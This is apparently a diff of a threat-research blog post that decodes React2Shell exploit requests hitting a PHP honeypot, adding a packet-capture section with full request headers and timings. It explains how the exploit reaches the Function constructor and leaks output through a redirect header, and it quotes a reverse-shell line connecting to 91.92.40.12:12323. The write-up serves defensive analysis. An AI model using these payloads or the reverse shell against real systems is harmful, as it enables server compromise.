@@ -112,7 +112,7 @@ td code{overflow-wrap:anywhere}
 <p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 15 November 2026</p>
 <h1>React2Shell on a Server With No React: Seven Payloads, Decoded</h1>
 <p>Attackers sent 58 React2Shell (CVE-2025-55182) exploit requests to a PHP honeypot that runs no JavaScript at all. Because nothing was at risk, we can show every payload in full: three scanner checks, a wget dropper, an environment-variable stealer, an in-memory redirect hijack, and one reverse shell that was retried 47 times.</p>
-<nav class="toc"><strong>Key Sections:</strong> Summary · How the Exploit Request Works · Scanner Checks · Dropper · Environment Theft · Redirect Hijack · Reverse Shell x 47 · What the Honeypot Answered · Packet Capture Note · IOCs · Detection (KQL) · Mitigation</nav>
+<nav class="toc"><strong>Key Sections:</strong> Summary · How the Exploit Request Works · Scanner Checks · Dropper · Environment Theft · Redirect Hijack · Reverse Shell x 47 · What the Honeypot Answered · Reverse Shell on the Wire · IOCs · Detection (KQL) · Mitigation</nav>
 <p class="small">Part of the <a href="/blog/honeypot-24-days-of-attacks/">PHP honeypot series</a>. Data: nginx request log from <code>vm-php-cve-lab</code>, 22 October – 15 November 2026 (UTC). Payloads are shown as captured; URLs are defanged.</p>
 
 <h2>1. Summary</h2>
@@ -169,7 +169,7 @@ Content-Disposition: form-data; name="2"
 <tr><td><code>"_formData":{"get":"$1:constructor:constructor"}</code></td><td>Another prototype walk: the constructor of the constructor of any object is <code>Function</code>. So the call above becomes <code>Function(_prefix + "1337")</code>, which compiles the attacker's string into a function.</td></tr>
 <tr><td><code>"_prefix":"…"</code></td><td>The JavaScript to run. The decoder appends the blob id, so the code ends with a statement separator and the stray <code>1337</code> is a harmless expression. The new function is stored as a <code>then</code> property, React awaits it, and it runs.</td></tr>
 </table>
-<p>One thing is missing from our copy. A real attack also needs a <code>Next-Action</code> request header so that Next.js routes the POST to the Server Action decoder. Our nginx log format recorded the request line, User-Agent, Content-Type and body only, so that header is not shown. It would have been there.</p>
+<p>One thing is missing from our copy. A real attack also needs a <code>Next-Action</code> request header so that Next.js routes the POST to the Server Action decoder. Our nginx log format recorded the request line, User-Agent, Content-Type and body only, so that header is not in the log. The packet capture in section 9 shows it on four later attempts: <code>Next-Action: x</code>.</p>
 <p><strong>Getting output back.</strong> Most payloads end by throwing an error named <code>NEXT_REDIRECT</code> with a <code>digest</code> string. Next.js uses exactly that error internally to implement <code>redirect()</code>. When it sees one, it answers with a redirect and copies the target into an <code>x-action-redirect</code> response header. The attacker puts command output into the target (<code>/login?a=&lt;output&gt;</code>) and reads it from the response header. No outbound connection is needed.</p>
 <p>The multipart boundaries are a fingerprint in their own right:</p>
 <pre><code>  54  ----WebKitFormBoundaryx8jO2oVc6SWP3Sad
@@ -464,9 +464,66 @@ cl.connect(12323,'91.92.40.12',()=&gt;{
 <p>The honeypot does have a PHP multipart parser behind that URL, and the <a href="/blog/php2shell-exploitation-in-the-wild/">PHP2Shell post</a> is about attacks on it. A React2Shell body is three tiny text fields, with no file part and no session field. PHP parsed it into <code>$_POST['0']</code>, <code>$_POST['1']</code>, <code>$_POST['2']</code> and discarded it. The container's Apache log shows one ordinary access line per request (<code>"POST / HTTP/1.0" 200</code>) and no PHP warning or error beside it. There is no JavaScript runtime on the host for the payload to reach.</p>
 <p>A 200 with an ordinary HTML page is a "not vulnerable" answer to every variant here: none of them got the redirect header or error digest it was looking for.</p>
 
-<h2>9. Packet Capture Note</h2>
-<p>The lab ran a rolling packet capture (<code>tcpdump</code>, full snap length, 20 files of 10 MB) on port 80 and the Docker bridges. A ring that small holds about a day and a half of traffic, and the last of it was overwritten on 15 November when the VM was restarted and a large package download passed through the capture filter. The packets for the requests in this post no longer exist. What remains is the nginx request log (request line, User-Agent, Content-Type and the complete request body) and the Apache log from inside the container, both shipped to Microsoft Sentinel as they were written. Every payload on this page is from those two sources.</p>
-<p>For this post the gap is one header: <code>Next-Action</code>. The body, which carries the whole exploit, was logged complete for all 58 requests; the largest is under 1.4 KB.</p>
+<h2>9. The Reverse Shell on the Wire</h2>
+<p>The lab ran a rolling packet capture (<code>tcpdump</code>, full snap length, 20 files of 10 MB) on port 80 and the Docker bridges. A ring that small holds about a day and a half of traffic, and the last of it was overwritten on 15 November when the VM was restarted and a large package download passed through the capture filter. The packets for the requests from 22 October to 15 November no longer exist. What remains is the nginx request log (request line, User-Agent, Content-Type and the complete request body) and the Apache log from inside the container, both shipped to Microsoft Sentinel as they were written. Sections 2 to 8 are built from those two sources.</p>
+<p>After that loss a new full-packet capture was started on the VM. It covers 15 Nov 2026 09:06:34 to 16 Nov 2026 00:10:59 UTC (500 TCP streams on port 80, plus every packet to or from the container address <code>172.18.0.2</code> on any port). That is after the end of the log data used above, and variant G was still coming: 4 more attempts, roughly every three to four hours, which makes 51 in total over 9 days.</p>
+<p>Every attempt has the same shape. A bare SYN arrives first, with no TCP options and an implausible TTL. The honeypot answers SYN-ACK and the sender resets. A fraction of a second later a normal Linux TCP stack connects from the same address and sends the exploit:</p>
+<pre><code>15 Nov 11:13:16.714  SYN-only probe  ttl=224 win=65535  no TCP options -&gt; SYN-ACK -&gt; RST
+15 Nov 11:13:17.036  full connection ttl=33  win=42340 mss=1460 wscale=12 SACK timestamps  (+0.32 s)
+
+15 Nov 14:57:38.238  SYN-only probe  ttl=225 win=65535  no TCP options -&gt; SYN-ACK -&gt; RST
+15 Nov 14:57:38.581  full connection ttl=44  win=42340 mss=1460 wscale=12 SACK timestamps  (+0.34 s)
+
+15 Nov 18:41:43.469  SYN-only probe  ttl=235 win=65535  no TCP options -&gt; SYN-ACK -&gt; RST
+15 Nov 18:41:43.742  full connection ttl=42  win=42340 mss=1460 wscale=12 SACK timestamps  (+0.27 s)
+
+15 Nov 21:46:38.970  SYN-only probe  ttl=235 win=65535  no TCP options -&gt; SYN-ACK -&gt; RST
+15 Nov 21:46:39.249  full connection ttl=44  win=42340 mss=1460 wscale=12 SACK timestamps  (+0.28 s)</code></pre>
+<p>The first packet is a stateless port scanner (masscan and ZMap build SYNs this way) checking that port 80 is open. The second connection is the exploit tool itself. Port check and exploit come from the same address a third of a second apart, so they are one automated pipeline.</p>
+<p>One full exploit connection, packet by packet:</p>
+<pre><code>+0.0000 s  attacker -&gt; honeypot S   
++0.0000 s  honeypot -&gt; attacker AS  
++0.2607 s  attacker -&gt; honeypot A   
++0.2608 s  attacker -&gt; honeypot AP  899 bytes
++0.2608 s  honeypot -&gt; attacker A   
++0.2622 s  honeypot -&gt; attacker AP  1929 bytes
++0.2622 s  honeypot -&gt; attacker AF  
++0.5225 s  attacker -&gt; honeypot A   
++0.5227 s  attacker -&gt; honeypot AF  
++0.5227 s  honeypot -&gt; attacker A   </code></pre>
+<p>One data segment in, one out, closed in about half a second. These are the complete request headers, which nginx never logged:</p>
+<pre><code>POST / HTTP/1.1
+Host: 13.75.195.138:80
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Length: 619
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Next-Action: x
+Accept-Encoding: gzip
+Connection: close</code></pre>
+<p>Two things are worth noting. The <code>Next-Action</code> header is present, with the value <code>x</code>. In Next.js this header is what sends a POST into the Server Action handler; public proof-of-concept code for React2Shell uses a dummy value like this, because the body is decoded before the action ID is looked up. And the body after the headers is 619 bytes, byte-for-byte identical to the body in the nginx log for the earlier 47 attempts.</p>
+<p>nginx forwarded it to the container like this (HTTP/1.0, with the client address added in <code>X-Real-IP</code> and <code>X-Forwarded-For</code>):</p>
+<pre><code>POST / HTTP/1.0
+Host: 13.75.195.138
+X-Real-IP: 91.92.40.12
+X-Forwarded-For: 91.92.40.12
+Connection: close
+Content-Length: 619
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Next-Action: x
+Accept-Encoding: gzip</code></pre>
+<p>and got this back, which it relayed to the attacker as the 1,929-byte reply above:</p>
+<pre><code>HTTP/1.1 200 OK
+Date: Sun, 15 Nov 2026 11:13:17 GMT
+Server: Apache/2.4.69 (Debian)
+X-Powered-By: PHP/8.3.36
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 1688
+Connection: close
+Content-Type: text/html; charset=UTF-8</code></pre>
+<p>The response says <code>PHP/8.3.36</code>, the patched build, not 8.3.35. When the VM was restarted on 15 November at 07:48 UTC the two lab containers came up in a different order and the patched comparison container took the address nginx forwards to. Since then, public traffic has been answered by the patched container. For a Node.js payload this makes no difference: neither container runs JavaScript.</p>
+<p>The capture also answers the question the logs cannot: did anything call back? The container sent 0 outbound connection attempts and made 0 DNS queries during the capture. Nothing reached for <code>91.92.40.12:12323</code>, which is what a working exploit would do within milliseconds.</p>
 
 <h2>10. IOCs</h2>
 <table><thead><tr><th>Source IP</th><th>Country</th><th>Requests</th><th>First seen (UTC)</th><th>Last seen (UTC)</th></tr></thead><tbody>
